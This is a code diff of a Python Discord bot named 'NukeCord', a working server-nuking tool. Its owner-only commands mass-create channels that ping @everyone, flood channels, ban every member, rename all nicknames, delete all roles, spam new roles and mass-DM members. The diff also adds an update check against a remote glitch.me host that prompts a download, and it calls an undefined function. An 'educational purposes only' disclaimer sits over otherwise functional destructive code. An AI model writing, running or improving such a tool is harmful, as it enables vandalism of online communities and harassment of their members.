@@ -1,24 +1,35 @@
-import discord, requests, sys
+import discord
+import requests
 from discord.ext import commands
-import json, os
-from time import sleep as wait
+import json
 from colorama import Fore as color
-from colorama import init
-from console.utils import set_title
-init()
+
 intents = discord.Intents.default()
 intents.members = True
+intents.messages = True
 intents.message_content = True
 bot = commands.Bot(command_prefix="nc!", intents=intents)
 bot.remove_command("help")
 
-q = input(color.RESET + "Type in the access key: ")
-if q != "metaverse":
-  print(color.RED + "Access key denied.")
-  wait(15)
-  sys.exit()
-  
-set_title("NukeCord | By Evo")
+# -------------------
+# CURRENT VERSION GOES HERE:
+version = "2.1"
+# -------------------
+
+try:
+    w = requests.get("https://pacity-database.glitch.me/nukecord.htm")
+    ver = w.text
+except requests.RequestException as e:
+    print(color.RED + f"[!] Failed to fetch version: {e}")
+    ver = version
+
+if ver != version:
+    print(color.RED + f"[!] UPDATE: NukeCord v.{ver} is available for download")
+    print("\n")
+    input(color.RESET + "Press enter to download the updated version ")
+    internet(url="https://pacity-database.glitch.me/nukecord-download.htm")
+    exit()
+
 print(color.YELLOW + """
                          __    _                                   
                     _wr""        "-q__                             
@@ -47,6 +58,7 @@ print(color.YELLOW + """
 
 
 """)
+
 f = open("config.json", "r")
 x = f.read()
 y = json.loads(x)
@@ -55,24 +67,30 @@ q = y["your_id"]
 ID = int(q)
 print(color.RESET + "[~] Do nc!help to get all commands")
 
-@bot.event 
+
+@bot.event
 async def on_ready():
     print(color.GREEN + f"[~] Logged in as {bot.user}")
 
 
 @bot.event
 async def on_command_error(ctx, error):
-  return
-    
-    
+    print(color.RED + f"[!] Command error: {error}")
+
+
 @bot.command()
 async def help(ctx):
     if ctx.author.id == ID:
-        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!alert <text>\nnc!flood <text>\nnc!ban\nnc!nicknames <text>\nnc!roles <text>\nnc!dm <text>\n```", color=0x36393e)
+        embed = discord.Embed(
+            title="This bot is running NukeCord",
+            description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!alert <text>\nnc!flood <text>\nnc!ban\nnc!nicknames <text>\nnc!roles <text>\nnc!dm <text>\n```",
+            color=0x36393e
+        )
         embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
+        embed.set_footer(text="Made by github.com/pacity", icon_url="https://avatars.githubusercontent.com/u/84800113?v=4")
         await ctx.send(embed=embed)
-
-
+    else:
+        print(color.RED + f"[!] {ctx.author.name} tried running help command")
 
 
 @bot.command()
@@ -89,22 +107,19 @@ async def nuke(ctx, *, arg):
         while x >= 0:
             ch = await ctx.guild.create_text_channel(arg)
             await ch.send(f"{arg} | @everyone")
-            x = int(x) -1
+            x = int(x) - 1
         print(color.GREEN + f"[~] Nuked {ctx.guild.name}")
+
 
 @bot.command()
 @commands.guild_only()
 async def alert(ctx, *, arg):
     if ctx.author.id == ID:
         for channel in ctx.guild.channels:
-            if type(channel) != discord.channel.TextChannel:
-                print("\n")
-            else:
-                await channel.send(f"{arg}")
-                await channel.send(f"{arg}")
-                await channel.send(f"{arg}")
-                
-                
+            if isinstance(channel, discord.TextChannel):
+                await channel.send(f"{arg}\n{arg}\n{arg}")
+
+
 @bot.command()
 @commands.guild_only()
 async def flood(ctx, *, arg):
@@ -115,7 +130,7 @@ async def flood(ctx, *, arg):
             i = int(i) - 1
         print(color.GREEN + f"[~] Flooded {ctx.channel.name}")
 
-            
+
 @bot.command()
 @commands.guild_only()
 async def ban(ctx):
@@ -131,10 +146,8 @@ async def ban(ctx):
             except:
                 print(color.RED + f"[!] Failed banning {member}")
         await msg.add_reaction("✅")
-    else:
-        return
-    
-    
+
+
 @bot.command()
 @commands.guild_only()
 async def nicknames(ctx, *, arg):
@@ -147,9 +160,7 @@ async def nicknames(ctx, *, arg):
             except:
                 print(color.RED + f"[!] Failed to change nickname of {member}")
         await msg.add_reaction("✅")
-    else:
-        return    
-            
+
 
 @bot.command()
 @commands.guild_only()
@@ -160,9 +171,9 @@ async def roles(ctx, *, arg):
         for role in ctx.guild.roles:
             try:
                 if role.name == bot.user.name:
-                  print(color.YELLOW + f"[~] Skipped deleting role {bot.user.name}")
+                    print(color.YELLOW + f"[~] Skipped deleting role {bot.user.name}")
                 else:
-                  await role.delete()
+                    await role.delete()
             except:
                 print(color.RED + f"[!] Failed to delete {role.name}")
         x = 100
@@ -171,7 +182,8 @@ async def roles(ctx, *, arg):
             await guild.create_role(name=arg)
             x = int(x) - 1
         await msg.add_reaction("✅")
-        
+
+
 @bot.command()
 @commands.guild_only()
 async def dm(ctx, *, arg):
@@ -185,13 +197,5 @@ async def dm(ctx, *, arg):
                 print(color.RED + f"[!] Failed to DM {member}")
         await msg.add_reaction("✅")
 
-        
-        
-        
-     
-        
-        
-        
-        
 
 bot.run(TOKEN)
